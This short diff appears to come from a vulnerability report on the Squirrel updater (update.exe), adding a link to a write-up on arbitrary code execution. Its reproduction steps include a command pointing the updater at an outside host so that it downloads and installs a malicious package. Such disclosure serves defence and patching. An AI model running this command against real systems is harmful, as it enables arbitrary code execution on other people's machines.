@@ -1,3 +1,5 @@
+https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12
+
 Steps to Reproduce:
 
 1. Exploit reproduce:
@@ -22,3 +24,5 @@ Step 2: Run the below command,
         E.g update.exe --update=http://192.168.198.135/
         
 Now the update command will download the malicious package and install automatically.
+
+
